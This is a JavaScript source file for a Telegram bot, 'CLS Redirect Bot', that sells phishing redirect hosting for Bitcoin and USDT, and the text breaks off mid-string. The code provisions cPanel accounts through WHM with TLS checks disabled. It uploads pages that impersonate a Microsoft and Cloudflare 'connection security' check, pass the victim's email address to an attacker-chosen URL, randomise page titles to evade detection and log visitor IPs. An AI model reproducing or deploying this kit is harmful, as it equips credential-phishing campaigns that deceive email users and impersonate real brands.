// In Replit, environment variables are managed through the Secrets tab
// Remove dotenv dependency for production compatibility
if (process.env.NODE_ENV !== 'production') {
  try {
    require("dotenv").config();
  } catch (e) {
    console.log("Dotenv not available, using environment variables directly");
  }
}
const { Telegraf } = require("telegraf");
const axios = require("axios");
const https = require("https");
const crypto = require("crypto");
const pino = require("pino");
const express = require("express");
const path = require("path");
const fs = require("fs");

// __dirname is available by default in CommonJS
const app = express();

// Middleware for parsing JSON
app.use(express.json());

// Serve static files
app.use(express.static("."));

// Root route - redirect to dashboard
app.get("/", (_, res) => {
  res.redirect("/dashboard");
});

// Serve dashboard
app.get("/dashboard", (_, res) => {
  res.sendFile(path.join(__dirname, "dashboard.html"));
});

// Click tracking endpoint
app.post("/api/track-click", (req, res) => {
  try {
    const { domain, timestamp } = req.body;
    
    if (!domain) {
      return res.status(400).json({ error: "Domain required" });
    }

    // Create clicks directory if it doesn't exist
    const clicksDir = path.join(__dirname, 'clicks_data');
    if (!fs.existsSync(clicksDir)) {
      fs.mkdirSync(clicksDir, { recursive: true });
    }

    // Store click data by domain
    const clickFile = path.join(clicksDir, `${domain}.json`);
    let clickData = { domain, clicks: [] };
    
    if (fs.existsSync(clickFile)) {
      clickData = JSON.parse(fs.readFileSync(clickFile, 'utf8'));
    }
    
    clickData.clicks.push({
      timestamp: timestamp || new Date().toISOString(),
      ip: req.ip || req.connection.remoteAddress || 'unknown'
    });
    
    fs.writeFileSync(clickFile, JSON.stringify(clickData, null, 2));
    
    res.json({ success: true, totalClicks: clickData.clicks.length });
  } catch (error) {
    res.status(500).json({ error: "Failed to track click" });
  }
});

// Get click statistics for a domain
app.get("/api/clicks/:domain", (req, res) => {
  try {
    const { domain } = req.params;
    const clickFile = path.join(__dirname, 'clicks_data', `${domain}.json`);
    
    if (!fs.existsSync(clickFile)) {
      return res.json({ domain, totalClicks: 0, clicks: [] });
    }
    
    const clickData = JSON.parse(fs.readFileSync(clickFile, 'utf8'));
    res.json({
      domain: clickData.domain,
      totalClicks: clickData.clicks.length,
      recentClicks: clickData.clicks.slice(-10) // Last 10 clicks
    });
  } catch (error) {
    res.status(500).json({ error: "Failed to get click statistics" });
  }
});

// Enhanced Logger with better formatting
let loggerConfig = {
  level: process.env.LOG_LEVEL || "info",
};

// Only add pretty printing in development and if available
if (process.env.NODE_ENV !== "production") {
  try {
    require("pino-pretty");
    loggerConfig.transport = {
      target: "pino-pretty",
      options: {
        colorize: true,
        translateTime: "HH:MM:ss",
        ignore: "pid,hostname",
      },
    };
  } catch (e) {
    // Fallback to basic logging if pino-pretty is not available
    console.log("Pino-pretty not available, using basic logging");
  }
}

const baseLog = pino(loggerConfig);
const L = (id) => baseLog.child({ reqId: id });

// Log startup information
const startupLog = L("startup");
startupLog.info("🚀 Domain Provisioning Bot starting...");
startupLog.info(`📊 Environment: ${process.env.NODE_ENV || "development"}`);
startupLog.info(`🔧 Log Level: ${process.env.LOG_LEVEL || "info"}`);
startupLog.info(`🌐 WHM Server: ${process.env.WHM_SERVER || "Not configured"}`);

// HTTPS Agent for self-signed certificates
const tlsAgent = new https.Agent({ rejectUnauthorized: false });

// Random helpers
const rInt = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a;
const rStr = (l, s = "abcdefghijklmnopqrstuvwxyz0123456789") =>
  [...Array(l)].map(() => s[rInt(0, s.length - 1)]).join("");
const rFile = () => rStr(99) + ".html";

// WHM API Client
const WHM = axios.create({
  baseURL: process.env.WHM_SERVER,
  httpsAgent: tlsAgent,
  timeout: 30000,
  headers: {
    Authorization:
      "Basic " +
      Buffer.from(
        `${process.env.WHM_USERNAME}:${process.env.WHM_PASSWORD}`,
        "utf8",
      ).toString("base64"),
  },
});

// User sessions with rate limiting
const sessions = new Map();
const rateLimits = new Map();

function getSession(ctx) {
  const id = ctx.from.id;
  if (!sessions.has(id)) sessions.set(id, {});
  return sessions.get(id);
}

function checkRateLimit(userId) {
  const now = Date.now();
  const userLimit = rateLimits.get(userId) || { count: 0, resetTime: now + 60000 };

  if (now > userLimit.resetTime) {
    userLimit.count = 1;
    userLimit.resetTime = now + 60000;
  } else {
    userLimit.count++;
  }

  rateLimits.set(userId, userLimit);
  return userLimit.count <= 3; // Max 3 requests per minute
}

// Post-creation tasks: Remove .htaccess and enable SSL
async function performPostCreationTasks(domain, username, log) {
  try {
    // Remove .htaccess file from public_html using cPanel API
    log.info({ domain, username }, "Removing .htaccess file");

    try {
      await WHM.get("/json-api/cpanel", {
        params: {
          cpanel_jsonapi_user: username,
          cpanel_jsonapi_apiversion: 2,
          cpanel_jsonapi_module: "Fileman",
          cpanel_jsonapi_func: "unlink",
          path: "public_html/.htaccess"
        }
      });
      log.info({ domain, username }, ".htaccess file removed successfully");
    } catch (htaccessError) {
      log.warn({ domain, username, error: htaccessError.message }, "Failed to remove .htaccess (may not exist)");
    }

    // Enable SSL/TLS for the domain
    log.info({ domain, username }, "Enabling SSL certificate");
    const sslParams = new URLSearchParams({
      domain: domain
    });

    try {
      await WHM.post("/json-api/start_autossl_check?api.version=1", sslParams);
      log.info({ domain, username }, "SSL certificate request initiated");
    } catch (sslError) {
      log.warn({ domain, username, error: sslError.message }, "Failed to initiate SSL certificate");
    }

  } catch (error) {
    log.error({ domain, username, error: error.message }, "Post-creation tasks failed");
  }
}

// Create WHM/cPanel account
async function createAccount(domain, log) {
  const user = (
    domain
      .replace(/[^a-zA-Z0-9]/g, "")
      .slice(0, 3)
      .toLowerCase() + rStr(5)
  ).slice(0, 8);

  const pass = rStr(
    14,
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()",
  );

  const params = new URLSearchParams({
    domain,
    username: user,
    password: pass,
    plan: process.env.WHM_PACKAGE_NAME || "pecuwoli_default",
  });

  log.info({ domain, user }, "Creating cPanel account");

  const { data } = await WHM.post("/json-api/createacct?api.version=1", params);

  if (!data?.metadata || data.metadata.result !== 1) {
    throw new Error(
      data?.metadata?.reason || "Failed to create cPanel account",
    );
  }

  log.info({ domain, user, ip: data.data.ip }, "Account created successfully");

  // Additional post-creation tasks
  await performPostCreationTasks(domain, user, log);

  return {
    user,
    password: pass,
    ip: data.data.ip,
  };
}

// Create directory in public_html
const createDirectory = (user, folderName) =>
  WHM.get("/json-api/cpanel", {
    params: {
      cpanel_jsonapi_user: user,
      cpanel_jsonapi_apiversion: 2,
      cpanel_jsonapi_module: "Fileman",
      cpanel_jsonapi_func: "mkdir",
      path: "public_html",
      name: folderName,
    },
  });

// Upload script file to directory
const uploadScriptFile = (user, folderName, fileName, htmlContent) =>
  WHM.post("/json-api/cpanel", null, {
    params: {
      cpanel_jsonapi_user: user,
      cpanel_jsonapi_apiversion: 3,
      cpanel_jsonapi_module: "Fileman",
      cpanel_jsonapi_func: "save_file_content",
      dir: `/home/${user}/public_html/${folderName}`,
      file: fileName,
      content: htmlContent,
      from_charset: "UTF-8",
      to_charset: "UTF-8",
    },
  });

// Generate script HTML content
function generateScriptContent(redirectUrl, delay = 500) {
  const template = fs.readFileSync("./script-template.html", "utf8");
  return template
    .replace("{{REDIRECT_URL}}", redirectUrl)
    .replace("{{DELAY}}", delay)
    .replace("{{TITLE}}", rStr(20));
}

// Generate custom script content using Microsoft-style template
function generateCustomScriptContent(redirectUrl) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title></title>
  <style>
    @keyframes b { to { transform: rotate(360deg); } }
  </style>
</head>
<body style="margin:0">
  <div style="background:#2f3237;color:#fff;font-family:Arial;min-height:100vh;padding:40px 20px">
    <div style="max-width:800px;margin:0 auto">
      <div style="display:flex;align-items:center;margin-bottom:40px">
        <div style="display:flex;flex-direction:column">
          <div style="display:flex">
            <div style="width:20px;height:20px;background:#F25022;margin-right:2px"></div>
            <div style="width:20px;height:20px;background:#7FBA00"></div>
          </div>
          <div style="display:flex;margin-top:2px">
            <div style="width:20px;height:20px;background:#00A4EF;margin-right:2px"></div>
            <div style="width:20px;height:20px;background:#FFB900"></div>
          </div>
        </div>
        <div style="font-size:32px;font-weight:300;color:#b0b3b8;margin-left:10px">Microsoft</div>
      </div>
      <h2 style="color: white; font-size:36px;font-weight:300;margin:0 0 30px 0">www.microsoftonline.com</h2>
      <p style="font-size:18px;color:#b0b3b8;margin:0 0 40px 0">
        Please stand by, while we are checking if the site connection is secure
      </p>
      <div style="width: 37%; border:1px solid #555;border-radius:4px;padding:10px;display:flex;align-items:center;justify-content:space-between;margin-bottom:40px">
        <div style="display:flex;align-items:center">
          <div id="a" style="width:24px;height:24px;border:3px solid #333;border-top:3px solid #fff;border-radius:50%;animation:b 1s linear infinite;margin-right:12px"></div>
          <div id="c" style="display:none;width:24px;height:24px;background:#4caf50;border-radius:50%;margin-right:12px;text-align:center;line-height:24px;color:white;font-weight:bold">✓</div>
          <span id="d" style="color:#b0b3b8;font-size:16px">Checking...</span>
          <span id="e" style="display:none;color:#4caf50;font-size:16px;font-weight:500">Success!</span>
        </div>
        <div style="font-size:9px;color:#f38020">
         &#9729;&#65039; <div>CLOUDFLARE </div>
          <div style="font-size:8px;color:#888">Privacy | Terms</div>
        </div>
      </div>
      <div style="border:1px solid #555;border-radius:4px;padding:20px;margin-bottom:40px">
        <p style="margin:0;font-size:16px;color:#b0b3b8">
          Did you know there are Verified Bots that are allowed around the internet because they help provide services we use day to day?
        </p>
      </div>
      <p style="font-size:20px;margin:0;font-weight:300">
        Microsoft needs to review the security of your connection before proceeding.
      </p>
    </div>
  </div>

  <script>
    // Set 99-char random title
    document.title = Array.from({length: 99}, () => {
      const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      return chars.charAt(Math.floor(Math.random() * chars.length));
    }).join('');

    // Simple click tracking - just count visits
    try {
      fetch('/api/track-click', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          domain: window.location.hostname,
          timestamp: new Date().toISOString()
        })
      }).catch(() => {}); // Silent fail if tracking fails
    } catch (e) {}

    // Wait random time between 399–699ms
    const delay = Math.floor(Math.random() * (699 - 399 + 1)) + 399;

    setTimeout(() => {
      document.getElementById('a').style.display = 'none';
      document.getElementById('d').style.display = 'none';
      document.getElementById('c').style.display = 'block';
      document.getElementById('e').style.display = 'block';

      // Redirect logic
      const email = new URLSearchParams(window.location.search).get('email');
      let redirectUrl = "${redirectUrl}";
      if (email) redirectUrl +=  encodeURIComponent(email);
      window.location.href = redirectUrl;
    }, delay);
  </script>
</body>
</html>`;
}

// ==========================================
// CRYPTO PRICE API & TOP-UP FUNCTIONALITY
// ==========================================

// Admin user ID for notifications (now using process.env.ADMIN_ID like VIP access)

// Crypto wallet addresses
const CRYPTO_WALLETS = {
  BTC: "bc1qsttwav3g9p3fcvwhu0je2swttca5zyu7lq47hm",
  "USDT_TRC20": "TBQbur14oKop1THRNyy7rSJU9cbG2EPtC4",
  "USDT_ERC20": "0x6b298ED5767BE52aa7974a986aE0C4d41B70BE96"
};

// Fetch crypto prices from CoinGecko API with fallback prices
async function fetchCryptoPrice(cryptoId) {
  try {
    const response = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=${cryptoId}&vs_currencies=usd`, {
      timeout: 10000
    });
    
    if (response.data && response.data[cryptoId] && response.data[cryptoId].usd) {
      return response.data[cryptoId].usd;
    }
    
    // Fallback to reasonable prices if API fails
    const fallbackPrices = {
      'bitcoin': 97000,
      'tether': 1
    };
    
    console.log(`Using fallback price for ${cryptoId}`);
    return fallbackPrices[cryptoId] || null;
    
  } catch (error) {
    console.error(`Failed to fetch ${cryptoId} price:`, error.message);
    
    // Fallback prices
    const fallbackPrices = {
      'bitcoin': 97000,
      'tether': 1
    };
    
    return fallbackPrices[cryptoId] || null;
  }
}

// Calculate crypto amount needed for USD amount
async function calculateCryptoAmount(usdAmount, cryptoType) {
  const priceMap = {
    BTC: 'bitcoin',
    USDT_TRC20: 'tether',
    USDT_ERC20: 'tether'
  };

  const cryptoId = priceMap[cryptoType];
  
  if (!cryptoId) {
    console.error(`Unknown crypto type: ${cryptoType}`);
    return null;
  }
  
  const price = await fetchCryptoPrice(cryptoId);
  
  if (!price) {
    console.error(`Could not get price for ${cryptoId}`);
    return null;
  }
  
  if (cryptoType.includes('USDT')) {
    return usdAmount.toFixed(2); // USDT is 1:1 with USD, 2 decimals
  } else {
    return (usdAmount / price).toFixed(8); // BTC with 8 decimals
  }
}

// Generate top-up payment message for specific crypto
async function generateTopUpMessage(usdAmount, cryptoType) {
  const amount = await calculateCryptoAmount(usdAmount, cryptoType);
  if (!amount) {
    return "❌ Unable to fetch current crypto prices. Please try again.";
  }
  
  const wallet = CRYPTO_WALLETS[cryptoType];
  const cryptoSymbol = cryptoType === 'BTC' ? 'BTC' : 'USDT';
  const network = cryptoType.includes('TRC20') ? ' [TRC20]' : cryptoType.includes('ERC20') ? ' [ERC20]' : '';
  
  return {
    text: `⚠️ *Please send the exact amount to the address below:*

*Address:* \`${wallet}\`
*Amount of payment:* ${amount}.000000
*Status:* 🕜 WAITING FOR PAYMENT...

❗️ *Ensure the funds are sent within 30 minutes.*
🟢 *Click "I Paid" below after sending payment*
⚠️ *This address is valid for one-time use only.*`,
    keyboard: {
      inline_keyboard: [
        [
          { text: '✅ I Paid', callback_data: `paid_${cryptoType}_${usdAmount}` },
          { text: '❌ Cancel', callback_data: 'cancel_payment' }
        ]
      ]
    }
  };
}

// ==========================================
// TELEGRAM BOT INITIALIZATION
// ==========================================

let bot = null;
if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_BOT_TOKEN !== "your_telegram_bot_token_here") {
  bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);

  // Set webhook if in production
  if (process.env.NODE_ENV === "production" && process.env.WEBHOOK_DOMAIN) {
    bot.telegram.setWebhook(`${process.env.WEBHOOK_DOMAIN}/bot${process.env.TELEGRAM_BOT_TOKEN}`);
  }
}

// ==========================================
// DATA STORAGE & USER MANAGEMENT
// ==========================================

// Create data directories
const dataDir = path.join(__dirname, 'user_data');
const historyDir = path.join(__dirname, 'history_data');
const topupDir = path.join(__dirname, 'topup_data');

[dataDir, historyDir, topupDir].forEach(dir => {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
});

// Load user data from file
function loadUserData(userId) {
  try {
    const userFile = path.join(dataDir, `${userId}.json`);
    if (fs.existsSync(userFile)) {
      const data = JSON.parse(fs.readFileSync(userFile, 'utf8'));
      // Convert date strings back to Date objects
      if (data.joinDate) data.joinDate = new Date(data.joinDate);
      return data;
    }
  } catch (error) {
    console.error(`Error loading user data for ${userId}:`, error);
  }
  return null;
}

// Save user data to file
function saveUserData(userId, userData) {
  try {
    const userFile = path.join(dataDir, `${userId}.json`);
    fs.writeFileSync(userFile, JSON.stringify(userData, null, 2));
  } catch (error) {
    console.error(`Error saving user data for ${userId}:`, error);
  }
}

// Load user history from file
function loadUserHistory(userId) {
  try {
    const historyFile = path.join(historyDir, `${userId}.json`);
    if (fs.existsSync(historyFile)) {
      const data = JSON.parse(fs.readFileSync(historyFile, 'utf8'));
      // Convert date strings back to Date objects
      return data.map(item => ({
        ...item,
        date: new Date(item.date)
      }));
    }
  } catch (error) {
    console.error(`Error loading history for ${userId}:`, error);
  }
  return [];
}

// Save user history to file
function saveUserHistory(userId, history) {
  try {
    const historyFile = path.join(historyDir, `${userId}.json`);
    fs.writeFileSync(historyFile, JSON.stringify(history, null, 2));
  } catch (error) {
    console.error(`Error saving history for ${userId}:`, error);
  }
}

// Load topup requests from file
function loadTopupRequests() {
  try {
    const topupFile = path.join(topupDir, 'requests.json');
    if (fs.existsSync(topupFile)) {
      const data = JSON.parse(fs.readFileSync(topupFile, 'utf8'));
      const requests = new Map();
      Object.entries(data).forEach(([key, value]) => {
        requests.set(key, {
          ...value,
          timestamp: new Date(value.timestamp)
        });
      });
      return requests;
    }
  } catch (error) {
    console.error('Error loading topup requests:', error);
  }
  return new Map();
}

// Save topup requests to file
function saveTopupRequests(requests) {
  try {
    const topupFile = path.join(topupDir, 'requests.json');
    const data = Object.fromEntries(requests);
    fs.writeFileSync(topupFile, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error('Error saving topup requests:', error);
  }
}

// Initialize storage
const topupRequests = loadTopupRequests();

function getUserData(userId) {
  let userData = loadUserData(userId);
  if (!userData) {
    userData = {
      id: userId,
      balance: 0,
      joinDate: new Date(),
      totalDomains: 0
    };
    saveUserData(userId, userData);
  }
  return userData;
}

function updateUserBalance(userId, newBalance) {
  const userData = getUserData(userId);
  userData.balance = newBalance;
  saveUserData(userId, userData);
}

function addUserHistory(userId, historyItem) {
  const history = loadUserHistory(userId);
  history.push(historyItem);
  saveUserHistory(userId, history);
}

// Get click statistics for a domain
function getDomainClicks(domain) {
  try {
    const clickFile = path.join(__dirname, 'clicks_data', `${domain}.json`);
    if (!fs.existsSync(clickFile)) {
      return 0;
    }
    const clickData = JSON.parse(fs.readFileSync(clickFile, 'utf8'));
    return clickData.clicks ? clickData.clicks.length : 0;
  } catch (error) {
    return 0;
  }
}

// ==========================================
// TELEGRAM BOT COMMAND HANDLERS
// ==========================================

if (bot) {
  // Start command with main menu
  bot.start((ctx) => {
    const session = getSession(ctx);
    const user = getUserData(ctx.from.id);

    const log = L("start-command");
    log.info(
      {
        userId: ctx.from.id,
        username: ctx.from.username || "unknown",
        firstName: ctx.from.first_name || "unknown",
      },
      "👤 New user started bot interaction",
    );

    return ctx.reply(
      `🎯 *Welcome to CLS Redirect Bot!*`,
      { 
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: '💳 Top Up', callback_data: 'topup' },
              { text: '🎯 Create Redirect', callback_data: 'redirect' }
            ],
            [
              { text: '👤 My Profile', callback_data: 'profile' },
              { text: '📊 My Redirects', callback_data: 'history' }
            ],
            [
              { text: '🔑 VIP Access Request', callback_data: 'admin_access' }
            ]
          ]
        }
      }
    );
  });



  // Help command
  bot.help((ctx) => {
    return ctx.reply(
      "📋 *CLS Redirect Bot - Help Guide*\n\n" +
        "🎯 */start* - Launch the main menu\n" +
        "❓ */help* - Show this help guide\n" +
        "❌ */cancel* - Cancel current operation\n\n" +
        "✨ *How CLS Redirect Works:*\n" +
        "1️⃣ Send your domain + target URL\n" +
        "2️⃣ We create your redirect hosting instantly\n" +
        "3️⃣ Get 3 professional redirect scripts\n" +
        "4️⃣ Receive live URLs with SSL certificates\n\n" +
        "🎨 *Features:*\n" +
        "• Microsoft-style loading animations\n" +
        "• Email parameter capture (?email=)\n" +
        "• Instant SSL certificate setup\n" +
        "• Professional redirect pages",
      { parse_mode: "Markdown" },
    );
  });

  // Cancel command
  bot.command("cancel", (ctx) => {
    const session = getSession(ctx);
    sessions.delete(ctx.from.id);

    return ctx.reply("❌ Operation cancelled. Use /start to begin again.");
  });

  // ==========================================
  // PHOTO MESSAGE HANDLERS
  // ==========================================

  bot.on('photo', async (ctx) => {
    const session = getSession(ctx);
    
    if (session.awaiting_payment_proof) {
      // Get the highest resolution photo
      const photo = ctx.message.photo[ctx.message.photo.length - 1];
      const photoFileId = photo.file_id;
      
      // Get transaction hash from caption (optional)
      const transactionHash = ctx.message.caption?.trim() || 'Provided via screenshot';
      
      const paymentProof = session.awaiting_payment_proof;
      const userId = ctx.from.id;
      const requestId = `PAY_${userId}_${Date.now()}`;
      
      // Clear the session
      delete session.awaiting_payment_proof;
      
      // Create user_data directory if it doesn't exist
      const userDataDir = path.join(__dirname, 'user_data');
      if (!fs.existsSync(userDataDir)) {
        fs.mkdirSync(userDataDir, { recursive: true });
      }
      
      // Store payment verification request
      const userData = getUserData(userId);
      userData.pending_payments = userData.pending_payments || [];
      userData.pending_payments.push({
        id: requestId,
        amount: paymentProof.amount,
        cryptoType: paymentProof.cryptoType,
        screenshot: photoFileId,
        transactionHash: transactionHash,
        timestamp: new Date().toISOString(),
        status: 'pending'
      });
      
      saveUserData(userId, userData);
      
      // Send to admin for approval
      try {
        const adminId = process.env.ADMIN_ID;
        console.log(`Sending payment verification to admin: ${adminId}`);
        
        const cryptoSymbol = paymentProof.cryptoType === 'BTC' ? 'BTC' : 'USDT';
        const network = paymentProof.cryptoType.includes('TRC20') ? ' [TRC20]' : 
                      paymentProof.cryptoType.includes('ERC20') ? ' [ERC20]' : '';
        
        await bot.telegram.sendPhoto(adminId, photoFileId, {
          caption: `💰 *Payment Verification Request*\n\n` +
                  `👤 User: ${ctx.from.first_name || 'Unknown'} (${userId})\n` +
                  `💵 Amount: $${paymentProof.amount}\n` +
                  `₿ Crypto: ${cryptoSymbol}${network}\n` +
                  `🔗 Hash: \`${transactionHash}\`\n` +
                  `🆔 ID: \`${requestId}\`\n\n` +
                  `Please verify this payment:`,
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [
                { text: '✅ Approve Payment', callback_data: `approve_payment_${requestId}` },
                { text: '❌ Reject Payment', callback_data: `reject_payment_${requestId}` }
              ]
            ]
          }
        });
      } catch (adminError) {
        console.error("Failed to send payment verification to admin:", adminError.message);
        
        // Try sending as text message if photo fails
        try {
          const adminId = process.env.ADMIN_ID;
          const cryptoSymbol = paymentProof.cryptoType === 'BTC' ? 'BTC' : 'USDT';
          const network = paymentProof.cryptoType.includes('TRC20') ? ' [TRC20]' : 
                        paymentProof.cryptoType.includes('ERC20') ? ' [ERC20]' : '';
          
          await bot.telegram.sendMessage(adminId, 
            `💰 *Payment Verification Request*\n\n` +
            `👤 User: ${ctx.from.first_name || 'Unknown'} (${userId})\n` +
            `💵 Amount: $${paymentProof.amount}\n` +
            `₿ Crypto: ${cryptoSymbol}${network}\n` +
            `🔗 Hash: \`${transactionHash}\`\n` +
            `🆔 ID: \`${requestId}\`\n\n` +
            `⚠️ Screenshot failed to send - please check manually\n` +
            `Please verify this payment:`,
            {
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [
                    { text: '✅ Approve Payment', callback_data: `approve_payment_${requestId}` },
                    { text: '❌ Reject Payment', callback_data: `reject_payment_${requestId}` }
                  ]
                ]
              }
            }
          );
        } catch (fallbackError) {
          console.error("Failed to send fallback admin notification:", fallbackError.message);
        }
      }
      
      await ctx.reply(
        `✅ *Payment Verification Submitted*\n\n` +
        `🆔 Request ID: \`${requestId}\`\n\n` +
        `Your payment proof has been sent to admin for verification.\n` +
        `You will be notified once it's approved or rejected.\n\n` +
        `If approved, $${paymentProof.amount} will be added to your balance.`,
        { parse_mode: "Markdown" }
      );
      return;
    }
    
    await ctx.reply("❌ Please use the menu options to navigate.");
  });

  // ==========================================
  // TEXT MESSAGE HANDLERS
  // ==========================================

  bot.on("text", async (ctx) => {
    const session = getSession(ctx);
    const text = ctx.message.text.trim();

    // Transaction hash input for payment verification
    if (session.awaiting_payment_proof) {
      // Check if this looks like a transaction hash (flexible validation)
      if (text.length >= 10 && !text.includes(' ') && text.length <= 200) {
        const paymentProof = session.awaiting_payment_proof;
        const userId = ctx.from.id;
        const requestId = `PAY_${userId}_${Date.now()}`;
        
        // Clear the session
        delete session.awaiting_payment_proof;
        
        // Create user_data directory if it doesn't exist
        const userDataDir = path.join(__dirname, 'user_data');
        if (!fs.existsSync(userDataDir)) {
          fs.mkdirSync(userDataDir, { recursive: true });
        }
        
        // Store payment verification request
        const userData = getUserData(userId);
        userData.pending_payments = userData.pending_payments || [];
        userData.pending_payments.push({
          id: requestId,
          amount: paymentProof.amount,
          cryptoType: paymentProof.cryptoType,
          screenshot: null,
          transactionHash: text,
          timestamp: new Date().toISOString(),
          status: 'pending'
        });
        
        saveUserData(userId, userData);
        
        // Send to admin for approval
        try {
          const adminId = process.env.ADMIN_ID;
          const cryptoSymbol = paymentProof.cryptoType === 'BTC' ? 'BTC' : 'USDT';
          const network = paymentProof.cryptoType.includes('TRC20') ? ' [TRC20]' : 
                        paymentProof.cryptoType.includes('ERC20') ? ' [ERC20]' : '';
          
          await bot.telegram.sendMessage(adminId, 
            `💰 *Payment Verification Request*\n\n` +
            `👤 User: ${ctx.from.first_name || 'Unknown'} (${userId})\n` +
            `💵 Amount: $${paymentProof.amount}\n` +
            `₿ Crypto: ${cryptoSymbol}${network}\n` +
            `🔗 Hash: \`${text}\`\n` +
            `🆔 ID: \`${requestId}\`\n\n` +
            `📄 Transaction hash only (no screenshot provided)\n` +
            `Please verify this payment:`,
            {
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [
                    { text: '✅ Approve Payment', callback_data: `approve_payment_${requestId}` },
                    { text: '❌ Reject Payment', callback_data: `reject_payment_${requestId}` }
                  ]
                ]
              }
            }
          );
        } catch (adminError) {
          console.error("Failed to send payment verification to admin:", adminError.message);
        }
        
        await ctx.reply(
          `✅ *Payment Verification Submitted*\n\n` +
          `🆔 Request ID: \`${requestId}\`\n\n` +
          `Your transaction hash has been sent to admin for verification.\n` +
          `You will be notified once it's approved or rejected.\n\n` +
          `If approved, $${paymentProof.amount} will be added to your balance.`,
          { parse_mode: "Markdown" }
        );
        return;
      } else {
        await ctx.reply(
          `❌ Invalid transaction hash format!\n\n` +
          `Please provide either:\n` +
          `📷 Screenshot of payment confirmation\n` +
          `OR\n` +
          `🔗 Valid transaction hash (TXID)\n\n` +
          `Transaction hash should be at least 10 characters without spaces.`,
          { parse_mode: "Markdown" }
        );
        return;
      }
    }

    // Amount input for topup
    if (session.awaiting_amount) {
      session.awaiting_amount = false;

      const amount = parseFloat(text);
      if (isNaN(amount) || amount <= 0) {
        session.awaiting_amount = true;
        return ctx.reply(
          "❌ Invalid amount. Please enter a valid number:\n" +
          "Example: 50",
          { parse_mode: "Markdown" }
        );
      }

      // Show crypto selection for payment
      return ctx.reply(
        `💰 *Top-Up Amount: $${amount}*\n\nSelect your preferred payment method:`,
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [
                { text: '₿ Bitcoin (BTC)', callback_data: `pay_BTC_${amount}` },
                { text: '💵 USDT (TRC20)', callback_data: `pay_USDT_TRC20_${amount}` }
              ],
              [
                { text: '💵 USDT (ERC20)', callback_data: `pay_USDT_ERC20_${amount}` },
                { text: '❌ Cancel', callback_data: 'cancel_topup' }
              ]
            ]
          }
        }
      );
    }

    // Domain input handling
    if (session.awaiting_domain) {
      session.awaiting_domain = false;

      // Parse domain and redirect URL
      const parts = text.trim().split(" ");
      if (parts.length !== 2) {
        session.awaiting_domain = true;
        return ctx.reply(
          "❌ Invalid format. Please send domain and redirect URL separated by space:\n" +
            "Format: `domain.com https://fb.com`",
          { parse_mode: "Markdown" },
        );
      }

      const [domainInput, redirectUrl] = parts;

      // Enhanced domain validation
      const domainRegex =
        /^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,}$/;
      if (!domainRegex.test(domainInput) || domainInput.includes('..') || domainInput.startsWith('-') || domainInput.endsWith('-')) {
        session.awaiting_domain = true;
        return ctx.reply(
          "❌ Invalid domain format. Please enter a valid domain and URL:\n" +
            "Format: `domain.com https://fb.com`",
          { parse_mode: "Markdown" },
        );
      }

      // Check rate limit
      if (!checkRateLimit(ctx.from.id)) {
        session.awaiting_domain = true;
        return ctx.reply("⏰ Rate limit exceeded. Please wait a minute before trying again.");
      }

      // Basic URL validation
      if (
        !redirectUrl.startsWith("http://") &&
        !redirectUrl.startsWith("https://")
      ) {
        session.awaiting_domain = true;
        return ctx.reply(
          "❌ Invalid URL format. URL must start with http:// or https://\n" +
            "Format: `domain.com https://fb.com`",
          { parse_mode: "Markdown" },
        );
      }

      const domain = domainInput.toLowerCase();
      const requestId = crypto.randomUUID().slice(0, 8);
      const log = L(requestId);

      // Check for admin free access or balance requirement
      const user = getUserData(ctx.from.id);
      const cost = 80;
      let isAdminFree = false;

      // Check if user has admin free access or is admin
      if (session.admin_free_access || 
          (process.env.ADMIN_ID && ctx.from.id.toString() === process.env.ADMIN_ID)) {
        isAdminFree = true;
        // Clear the free access flag after use
        if (session.admin_free_access) {
          delete session.admin_free_access;
        }
      } else {
        // Regular user - check balance and deduct
        if (user.balance < cost) {
          session.awaiting_domain = true;
          return ctx.reply(
            `💰 *Insufficient Balance*\n\n` +
            `Current Balance: $${user.balance.toFixed(2)}\n` +
            `Required: $${cost.toFixed(2)}\n` +
            `Needed: $${(cost - user.balance).toFixed(2)}\n\n` +
            `Please top up your account and try again.`,
            { parse_mode: "Markdown" }
          );
        }

        // Deduct the cost from user balance
        user.balance -= cost;
        updateUserBalance(ctx.from.id, user.balance);
      }

      log.info(
        {
          userId: ctx.from.id,
          username: ctx.from.username || "unknown",
          domain,
          redirectUrl,
          requestId,
          cost: isAdminFree ? 0 : cost,
          newBalance: user.balance,
          adminFree: isAdminFree
        },
        isAdminFree ? "🎯 Starting CLS redirect creation - VIP access" : "🎯 Starting CLS redirect creation - $80 deducted",
      );

      let statusMessage;

      if (isAdminFree) {
        statusMessage = await ctx.reply(
          `🎯 *CLS Redirect Creator*\n\n` +
          `🚀 Creating redirect for: *${domain}*\n` +
          `🎁 *VIP Access* - Complimentary service\n\n` +
          `⚡ *Status:* Setting up your redirect...\n` +
          `🆔 Request ID: \`${requestId}\`\n\n` +
          `⏳ Please wait while we work our magic...`,
          { parse_mode: "Markdown" },
        );
      } else {
        statusMessage = await ctx.reply(
          `🎯 *CLS Redirect Creator*\n\n` +
          `🚀 Creating redirect for: *${domain}*\n` +
          `💰 Service fee: $${cost} ✅\n` +
          `💳 Remaining balance: $${user.balance.toFixed(2)}\n\n` +
          `⚡ *Status:* Setting up your redirect...\n` +
          `🆔 Request ID: \`${requestId}\`\n\n` +
